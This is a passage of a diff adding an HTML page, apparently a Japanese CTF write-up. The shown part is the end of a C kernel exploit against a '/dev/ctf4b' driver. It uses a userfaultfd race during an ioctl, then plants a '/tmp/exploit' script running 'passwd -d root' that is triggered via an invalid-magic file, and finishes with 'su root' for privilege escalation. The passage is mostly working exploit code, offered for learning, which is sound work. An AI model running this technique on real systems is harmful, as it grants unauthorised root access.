+<span class="giallo-l"><span style="color: #9ABDF5;">      .mode </span><span style="color: #89DDFF;">=</span><span style="color: #9ABDF5;"> UFFDIO_REGISTER_MODE_MISSING</span><span style="color: #89DDFF;">,</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">  }</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  assert</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">ioctl</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">uffd</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> UFFDIO_REGISTER</span><span style="color: #89DDFF;">, &amp;</span><span style="color: #7AA2F7;">uffdio_register</span><span style="color: #9ABDF5;">)</span><span style="color: #BB9AF7;"> !=</span><span style="color: #89DDFF;"> -</span><span style="color: #FF9E64;">1</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">  pthread_t</span><span style="color: #9ABDF5;"> th</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  assert</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">pthread_create</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&amp;</span><span style="color: #7AA2F7;">th</span><span style="color: #89DDFF;">,</span><span style="color: #FF9E64;"> NULL</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> userfaultfd_handler</span><span style="color: #89DDFF;">,</span><span style="color: #9ABDF5;"> (</span><span style="color: #BB9AF7;">void</span><span style="color: #89DDFF;"> *</span><span style="color: #9ABDF5;">)</span><span style="color: #7AA2F7;">uffd</span><span style="color: #9ABDF5;">)</span><span style="color: #BB9AF7;"> ==</span><span style="color: #FF9E64;"> 0</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">int</span><span style="color: #7AA2F7;"> main</span><span style="color: #9ABDF5;">() {</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">  fd </span><span style="color: #89DDFF;">=</span><span style="color: #7AA2F7;"> open</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">/dev/ctf4b</span><span style="color: #89DDFF;">&quot;,</span><span style="color: #7AA2F7;"> O_RDWR</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  assert</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">fd </span><span style="color: #BB9AF7;">!=</span><span style="color: #89DDFF;"> -</span><span style="color: #FF9E64;">1</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">  // userfaultfdに利用する領域。1度だけハンドラを実行するので0x1000で良い</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">  void</span><span style="color: #89DDFF;"> *</span><span style="color: #9ABDF5;">page </span><span style="color: #89DDFF;">=</span><span style="color: #7AA2F7;"> mmap</span><span style="color: #9ABDF5;">(</span><span style="color: #FF9E64;">NULL</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> PAGE_SIZE</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> PROT_READ </span><span style="color: #89DDFF;">|</span><span style="color: #7AA2F7;"> PROT_WRITE</span><span style="color: #89DDFF;">,</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">                    MAP_PRIVATE </span><span style="color: #89DDFF;">|</span><span style="color: #7AA2F7;"> MAP_ANONYMOUS</span><span style="color: #89DDFF;">, -</span><span style="color: #FF9E64;">1</span><span style="color: #89DDFF;">,</span><span style="color: #FF9E64;"> 0</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  assert</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">page </span><span style="color: #BB9AF7;">!=</span><span style="color: #7AA2F7;"> MAP_FAILED</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">  // userfaultfdに領域を登録する</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  printf</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">[main] setup userfaultfd to recv pagefault</span><span style="color: #89DDFF;">\n&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  register_userfaultfd</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">page</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> PAGE_SIZE</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">  // pageをそのまま渡す</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">  // CTF4b_IOCTL_WRITEにおける最初のcopy_from_userで止める</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">  // これはstruct ctf4b_requestに対するアクセスになる</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">  // つまりハンドラではstruct ctf4b_requestを返す必要がある</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  printf</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">[main] execute CTF4b_IOCTL_WRITE to trigger page fault</span><span style="color: #89DDFF;">\n&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  ioctl</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">fd</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> CTF4b_IOCTL_WRITE</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> page</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">  /*</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">   * /tmp/exploit</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">   * マジックナンバーが不明な実行ファイルが実行された際に、実行されるファイル</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">   * passwd -d rootでrootのパスワードを削除する</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">   * この状態でsurootするとパスワード不要で権限昇格可能</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">   *</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">   * /tmp/invalid_magic</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">   * マジックナンバーが不明な実行ファイル</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">   * /tmp/exploitを起爆するためだけのファイル</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">   */</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  system</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">echo -e &#39;#!/bin/sh</span><span style="color: #89DDFF;">\n</span><span style="color: #9ECE6A;">passwd -d root</span><span style="color: #89DDFF;">\n</span><span style="color: #9ECE6A;">&#39; &gt; /tmp/exploit</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  system</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">chmod +x /tmp/exploit</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  system</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">echo -e &#39;</span><span style="color: #89DDFF;">\xde\xad\xbe\xaf</span><span style="color: #9ECE6A;">&#39; &gt; /tmp/invalid_magic</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  system</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">chmod +x /tmp/invalid_magic</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  system</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">/tmp/invalid_magic</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  system</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">/bin/sh -c </span><span style="color: #89DDFF;">\&quot;</span><span style="color: #9ECE6A;">su root</span><span style="color: #89DDFF;">\&quot;&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  close</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">fd</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">  return</span><span style="color: #FF9E64;"> 0</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">}</span></span>
+<span class="giallo-l"></span></code></pre>
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h">Thanks for reading! Read other posts?</span>
+                    <hr />
+                </div>
+                <div class="pagination__buttons">
+                        <span class="button previous">
+                            <a href="https://figaro-san.github.io/daily-alpacahack-2026-jan-to-apr-pwn/">
+                                <span class="button__icon">←</span>&nbsp;
+                                <span class="button__text">Daily AlpacaHack 1-4月分 (pwn)</span>
+                            </a>
+                        </span>
+                    
+                    </div>
+            </div>
+        
+    </div>
+
+    </div>
+
+    
+    <footer class="footer">
+        <div class="footer__inner">
+                <div class="copyright">
+                        <span>© 
+    2026
+ Powered by <a href="https://www.getzola.org/">Zola</a></span>
+                    <span class="copyright-theme">
+                        <span class="copyright-theme-sep">:: </span>
+                        Theme: <a href="https://github.com/pawroman/zola-theme-terminimal/">Terminimal</a> by pawroman
+                    </span>
+                </div>
+            </div>
+    </footer>
+    
+
+</div>
+</body>
+
+</html>
